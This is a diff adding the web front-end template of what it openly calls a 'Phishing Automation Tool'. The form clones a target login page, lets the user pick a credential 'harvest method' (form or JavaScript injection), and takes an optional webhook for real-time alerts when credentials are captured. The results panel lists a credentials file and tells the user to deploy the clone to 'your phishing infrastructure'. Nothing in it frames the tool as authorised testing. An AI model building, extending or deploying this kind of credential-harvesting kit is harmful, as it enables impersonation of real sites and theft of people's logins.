@@ -1,0 +1,106 @@
+{% extends "base.html" %}
+{% block title %}Page Cloner - Phishing Automation Tool{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-lg-8 mx-auto">
+        <h1 class="mb-4"><i class="bi bi-files"></i> Landing Page Cloner</h1>
+
+        <div class="card mb-4">
+            <div class="card-body">
+                <form id="cloneForm">
+                    <div class="mb-3">
+                        <label class="form-label">Target URL</label>
+                        <input type="url" class="form-control" name="url" placeholder="https://example.com/login" required>
+                    </div>
+                    <div class="row">
+                        <div class="col-md-6 mb-3">
+                            <label class="form-label">Harvest Method</label>
+                            <select class="form-select" name="harvest_method">
+                                <option value="form">Form Injection</option>
+                                <option value="javascript">JavaScript</option>
+                            </select>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <label class="form-label">Include Assets</label>
+                            <select class="form-select" name="include_assets">
+                                <option value="true">Yes (CSS, JS, Images)</option>
+                                <option value="false">No (HTML Only)</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Webhook URL (Optional)</label>
+                        <input type="url" class="form-control" name="webhook_url" placeholder="https://webhook.site/...">
+                        <small class="form-text text-muted">Receive real-time notifications when credentials are captured</small>
+                    </div>
+                    <button type="submit" class="btn btn-primary btn-lg w-100">
+                        <i class="bi bi-download"></i> Clone Page
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <div id="cloneResults" style="display:none;" class="card">
+            <div class="card-header bg-success text-white">
+                <i class="bi bi-check-circle"></i> Clone Successful
+            </div>
+            <div class="card-body">
+                <div id="cloneResultsContent"></div>
+            </div>
+        </div>
+
+        <div id="cloneLoading" style="display:none;" class="text-center py-5">
+            <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;"></div>
+            <p class="mt-3">Cloning page... This may take a minute...</p>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+document.getElementById('cloneForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const formData = new FormData(this);
+    const data = {
+        url: formData.get('url'),
+        harvest_method: formData.get('harvest_method'),
+        include_assets: formData.get('include_assets') === 'true',
+        webhook_url: formData.get('webhook_url') || null
+    };
+
+    document.getElementById('cloneLoading').style.display = 'block';
+    document.getElementById('cloneResults').style.display = 'none';
+
+    try {
+        const response = await axios.post('/api/clone/page', data);
+        const result = response.data.result;
+
+        document.getElementById('cloneLoading').style.display = 'none';
+
+        if (result.success) {
+            document.getElementById('cloneResultsContent').innerHTML = `
+                <p><strong>Target URL:</strong> ${result.target_url}</p>
+                <p><strong>Clone Directory:</strong> <code>${result.clone_directory}</code></p>
+                <p><strong>HTML File:</strong> <code>${result.html_file}</code></p>
+                <p><strong>Credentials File:</strong> <code>${result.credentials_file}</code></p>
+                <p><strong>Timestamp:</strong> ${result.timestamp}</p>
+                <div class="alert alert-info mt-3">
+                    <i class="bi bi-info-circle"></i>
+                    <strong>Next Steps:</strong> Deploy the cloned files to your phishing infrastructure and configure your web server.
+                </div>
+            `;
+            document.getElementById('cloneResults').style.display = 'block';
+            utils.showToast('Page cloned successfully!', 'success');
+        } else {
+            utils.showToast('Clone failed: ' + result.error, 'danger');
+        }
+    } catch (error) {
+        document.getElementById('cloneLoading').style.display = 'none';
+        utils.showToast('Failed to clone page', 'danger');
+    }
+});
+</script>
+{% endblock %}
